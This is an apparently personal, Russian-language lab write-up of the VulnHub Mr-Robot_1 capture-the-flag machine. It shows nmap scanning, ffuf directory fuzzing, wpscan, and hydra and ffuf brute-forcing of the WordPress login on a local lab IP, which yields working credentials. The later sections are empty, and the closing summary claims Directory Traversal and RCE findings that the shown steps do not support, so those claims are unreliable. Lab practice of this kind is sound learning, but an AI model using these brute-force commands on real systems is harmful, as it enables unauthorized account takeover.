# VulnHub - Lin Intermediate - Mr-Robot_1

📅 Дата: 2025-07-22  
🧠 Сложность:  
💻 IP-адрес: 192.168.56.129  

---

## Sugar

```bash
nmap_ctf() {
  local ip=$1
  sudo nmap -sS -p- -Pn --max-parallelism 100 --min-rate 1000 -v -oN nmap-sS.txt $ip && nmap -sT -Pn -sV -T4 -A -v -p "$(grep -oP \"^[0-9]+(?=/tcp\s+open)\" nmap-sS.txt | sort -n | paste -sd \",\")" -oN nmap-sV.txt $ip
}
```


## 🔍 Сканирование

```bash
export ip=192.168.56.129 && nmap_ctf $ip
```

### nmap  
```bash
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open  ssl/http Apache httpd
|_http-server-header: Apache
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16:3b19:87c3:42ad:6634:c1c9:d0aa:fb97
|_SHA-1: ef0c:5fa5:931a:09a5:687c:a2c2:80c4:c792:07ce:f71b
|_http-title: Site doesn't have a title (text/html).
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
MAC Address: 08:00:27:06:5B:DB (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.9 (97%), Linux 3.18 (93%), Android 4.1.1 (91%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (91%), Android 4.0 (91%), Android 5.1 (91%), Linux 2.6.32 (91%), Linux 3.2 - 3.16 (91%), Linux 3.2 - 3.8 (91%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.000 days (since Tue Jul 22 09:54:03 2025)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   1.09 ms 192.168.56.129
```
![nmap scan](screenshots/nmap_scan.png)

---

## 🕵️ Enumeration

<script>var USER_IP='208.185.115.6';var BASE_URL='index.html';var RETURN_URL='index.html';var REDIRECT=false;window.log=function(){log.history=log.history||[];log.history.push(arguments);if(this.console){console.log(Array.prototype.slice.call(arguments));}};</script>
### robots.txt
![robots_txt](screenshots/01.robots_txt.png)
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Первый ключ по адресу `http://192.168.56.129/key-1-of-3.txt`
```
073403c8a58a1f80d943455fb30724b9
```

Загружаю себе `http://192.168.56.129/fsocity.dic`
```bash
wget http://192.168.56.129/fsocity.dic
```

Сортирую и фильтрую
```bash
sort fsocity.dic | uniq > fsocity_filtered.txt
```

### WordPress
Первичный фаззинг показал, что используется WordPress
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Intermediate - Mr-Robot_1/exploits]
└─$ ffuf -fc 404 -t 40 -w /media/sf_Exchange/Dictionaries/Dir/directory-list-2.3-medium.txt -u http://$ip/FUZZ -ic -c     

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.129/FUZZ
 :: Wordlist         : FUZZ: /media/sf_Exchange/Dictionaries/Dir/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

images                  [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 16ms]
blog                    [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 48ms]
sitemap                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 58ms]
login                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 77ms]
rss                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 739ms]
video                   [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 1ms]
0                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 839ms]
feed                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 862ms]
image                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 847ms]
atom                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 860ms]
wp-content              [Status: 301, Size: 241, Words: 14, Lines: 8, Duration: 1ms]
admin                   [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 3ms]
audio                   [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 1ms]
intro                   [Status: 200, Size: 516314, Words: 2076, Lines: 2028, Duration: 4ms]
wp-login                [Status: 200, Size: 2620, Words: 115, Lines: 53, Duration: 880ms]
css                     [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 1ms]
rss2                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 867ms]
license                 [Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 3ms]
wp-includes             [Status: 301, Size: 242, Words: 14, Lines: 8, Duration: 2ms]
js                      [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 2ms]
Image                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 857ms]
rdf                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 849ms]
page1                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 858ms]
readme                  [Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 3ms]
robots                  [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 4ms]
dashboard               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 821ms]
%20                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 797ms]
wp-admin                [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 1ms]
phpmyadmin              [Status: 403, Size: 94, Words: 14, Lines: 1, Duration: 1ms]
0000                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 808ms]
xmlrpc                  [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 958ms]
IMAGE                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 855ms]
wp-signup               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 798ms]
```

### wpscan
Поэтому использую wpscan
```bash
┌──(kali㉿0x2d-pentest)-[~/Downloads]
└─$ wpscan --url http://192.168.56.129/ -v        
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] File(s) Updated:
 |  metadata.json
[i] Update completed.

[+] URL: http://192.168.56.129/ [192.168.56.129]
[+] Started: Tue Jul 22 10:06:08 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://192.168.56.129/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.56.129/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] The external WP-Cron seems to be enabled: http://192.168.56.129/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.56.129/923a242.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.56.129/923a242.html, Match: 'WordPress 4.3.1'

[+] WordPress theme in use: twentyfifteen
 | Location: http://192.168.56.129/wp-content/themes/twentyfifteen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://192.168.56.129/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 4.0
 | Style URL: http://192.168.56.129/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, straightforward typography is readable on a wide variety of screen sizes, and suitable for multiple languages. We designed it using a mobile-first approach, meaning your content takes center-stage, regardless of whether your visitors arrive by smartphone, tablet, laptop, or desktop computer.
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 | License: GNU General Public License v2 or later
 | License URI: http://www.gnu.org/licenses/gpl-2.0.html
 | Tags: black, blue, gray, pink, purple, white, yellow, dark, light, two-columns, left-sidebar, fixed-layout, responsive-layout, accessibility-ready, custom-background, custom-colors, custom-header, custom-menu, editor-style, featured-images, microformats, post-formats, rtl-language-support, sticky-post, threaded-comments, translation-ready
 | Text Domain: twentyfifteen
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.56.129/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:27 <===================================> (137 / 137) 100.00% Time: 00:00:27

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Jul 22 10:06:54 2025
[+] Requests Done: 182
[+] Cached Requests: 6
[+] Data Sent: 44.786 KB
[+] Data Received: 13.958 MB
[+] Memory used: 281.422 MB
[+] Elapsed time: 00:00:46
```

Пробую сбрутить имя пользователя с помощью полученного словаря
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Intermediate - Mr-Robot_1/exploits]
└─$ hydra -L ./fsocity_filtered.txt -p admin -t 40 192.168.56.129 -s 80 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.129%2Fwp-admin%2F&testcookie=1:F=Invalid username" 

[80][http-post-form] host: 192.168.56.129   login: Elliot   password: admin
[80][http-post-form] host: 192.168.56.129   login: elliot   password: admin
[80][http-post-form] host: 192.168.56.129   login: ELLIOT   password: admin

Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-22 11:04:17
```

Hydra прошла по словарю за 11 минут...  
Просто из любопытства проведу **benchmark** с помощью `ffuf` и фильтрации по размеру ответа  
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Intermediate - Mr-Robot_1/exploits]
└─$ ffuf -request ./post.txt -t 40 -request-proto http -w ./fsocity_filtered.txt -ic -c -fs 3608

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://192.168.56.129/wp-login.php
 :: Wordlist         : FUZZ: /home/kali/Labs/VulnHub/Lin Intermediate - Mr-Robot_1/exploits/fsocity_filtered.txt
 :: Header           : Referer: http://192.168.56.129/wp-login.php
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Priority: u=0, i
 :: Header           : Host: 192.168.56.129
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Origin: http://192.168.56.129
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Connection: keep-alive
 :: Header           : Cookie: s_cc=true; s_fid=79C0FCABB9686E81-21543240C5D7C7BB; s_nr=1753192766411; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check
 :: Data             : log=FUZZ&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.129%2Fwp-admin%2F&testcookie=1
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 3608
________________________________________________

elliot                  [Status: 200, Size: 3659, Words: 144, Lines: 59, Duration: 1561ms]
Elliot                  [Status: 200, Size: 3659, Words: 144, Lines: 59, Duration: 1570ms]
ELLIOT                  [Status: 200, Size: 3659, Words: 144, Lines: 59, Duration: 1622ms]
:: Progress: [11451/11451] :: Job [1/1] :: 25 req/sec :: Duration: [0:07:12] :: Errors: 5 ::
```

### Вывод по бенчмарку
`ffuf` на 30% быстрее, чем `hydra` для этой задачи, но не поддерживает возобновление после сбоя/прерывания

### Получил доступ к панели
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Intermediate - Mr-Robot_1/exploits]
└─$ ffuf -request ./post.txt -t 40 -request-proto http -w ./fsocity_filtered.txt -ic -c -fs 3659

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://192.168.56.129/wp-login.php
 :: Wordlist         : FUZZ: /home/kali/Labs/VulnHub/Lin Intermediate - Mr-Robot_1/exploits/fsocity_filtered.txt
 :: Header           : Origin: http://192.168.56.129
 :: Header           : Connection: keep-alive
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Referer: http://192.168.56.129/wp-login.php
 :: Header           : Cookie: s_cc=true; s_fid=79C0FCABB9686E81-21543240C5D7C7BB; s_nr=1753192766411; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check
 :: Header           : Priority: u=0, i
 :: Header           : Host: 192.168.56.129
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
 :: Data             : log=elliot&pwd=FUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.129%2Fwp-admin%2F&testcookie=1
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 3659
________________________________________________

20150603025145          [Status: 200, Size: 1512, Words: 1, Lines: 1, Duration: 1573ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Креды `elliot:20150603025145`


## 📂 Получение доступа



## ⚙️ Привилегии



## 🏁 Флаги

- User flag: 
- Root flag: 

---

## 📋 Резюме

🧰 **Инструменты:**
  - nmap, ffuf, и др.

🚨 **Уязвимости, которые удалось обнаружить:**  
  - Directory Traversal  
  - RCE через уязвимый скрипт  

🛡 **Советы по защите:**
  - Использовать сложные пароли и ограничить число попыток входа
  - Обновлять ПО до актуальных версий
  - Удалять/ограничивать использование SUID-бинарников
  - Настроить логирование и мониторинг системных событий
  - Применять принцип наименьших привилегий


